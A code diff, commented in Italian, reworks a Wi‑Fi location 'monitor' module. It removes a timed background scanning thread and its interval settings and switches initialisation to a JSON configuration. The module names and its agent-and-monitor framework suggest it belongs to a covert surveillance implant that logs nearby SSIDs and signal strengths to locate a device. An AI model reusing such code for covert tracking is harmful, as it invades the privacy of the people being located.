@@ -1,5 +1,3 @@
-
-#define WIFI_CAPTURE_INTERVAL 60 // In secondi
 #define TYPE_LOCATION_WIFI 3
 
 typedef struct _wifiloc_param_struct {
@@ -20,13 +18,6 @@ typedef struct _wifiloc_data_struct {
     UCHAR Ssid[32];         // SSID
     INT iRssi;              // Received signal 
 } wifiloc_data_struct;
-
-DWORD wifi_location_interval = WIFI_CAPTURE_INTERVAL; // In secondi.
-
-BOOL bPM_WifiLocationStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
-BOOL bPM_wflcp = FALSE; // Semaforo per l'uscita del thread
-HANDLE hWifiLocationThread = NULL;
-DWORD g_wifiloc_delay = 0;
 
 #include <wlanapi.h>
 typedef DWORD (WINAPI *WlanOpenHandle_t) (DWORD, PVOID, PDWORD, PHANDLE);
@@ -131,75 +122,21 @@ BOOL EnumWifiNetworks()
     return TRUE;
 }
 
-DWORD WINAPI WifiLocationThread(DWORD dummy)
-{
-	LOOP {
-		if (g_wifiloc_delay == 0)
-			EnumWifiNetworks();
-
-		// Ricorda quanto aveva aspettato prima che il thread
-		// sia killato
-		// g_wifiloc_delay e' in decimi di secondo
-		while (g_wifiloc_delay < wifi_location_interval*10) {
-			Sleep(200); 
-			g_wifiloc_delay += 2;
-			CANCELLATION_POINT(bPM_wflcp);
-		}
-		g_wifiloc_delay = 0;
-	}
-}
-
-
 DWORD __stdcall PM_WiFiLocationStartStop(BOOL bStartFlag, BOOL bReset)
 {
-	DWORD dummy;
-
-	// Se l'agent e' gia' nella condizione desiderata
-	// non fa nulla.
-	if (bPM_WifiLocationStarted == bStartFlag)
-		return 0;
-
-	bPM_WifiLocationStarted = bStartFlag;
-
-	if (bStartFlag) {
-		// Se e' stato startato esplicitamente, ricomincia da capo
-		if (bReset)
-			g_wifiloc_delay = 0;
-
-		// Crea il thread che esegue l'enumerazione die wifi
-		hWifiLocationThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WifiLocationThread, NULL, 0, &dummy);
-	} else {
-		QUERY_CANCELLATION(hWifiLocationThread, bPM_wflcp);
-	}
-
+	if (bStartFlag && bReset) 
+		EnumWifiNetworks();
 	return 1;
 }
 
 
-DWORD __stdcall PM_WiFiLocationInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_WiFiLocationInit(JSONObject elem)
 {
-	wifiloc_param_struct *wifiloc_param = (wifiloc_param_struct *)conf_ptr;
-
-	// Setta il capture interval 
-	if (wifiloc_param) {
-		wifi_location_interval = wifiloc_param->interval/1000; // nella conf di mobile era in millisecondi
-		if (wifi_location_interval == 0)
-			wifi_location_interval = 1; // almeno ci deve essere un secondo di intervallo
-	} else { // di default e' settato a WIFI_CAPTURE_INTERVAL
-		wifi_location_interval = WIFI_CAPTURE_INTERVAL;
-	}
-
-	PM_WiFiLocationStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
 
 void PM_WiFiLocationRegister()
 {
-	// Non ha nessuna funzione di Dispatch
-	AM_MonitorRegister(PM_WIFILOCATION, NULL, (BYTE *)PM_WiFiLocationStartStop, (BYTE *)PM_WiFiLocationInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_WiFiLocationInit(NULL, FALSE);
+	AM_MonitorRegister(L"position", PM_WIFILOCATION, NULL, (BYTE *)PM_WiFiLocationStartStop, (BYTE *)PM_WiFiLocationInit, NULL);
 }
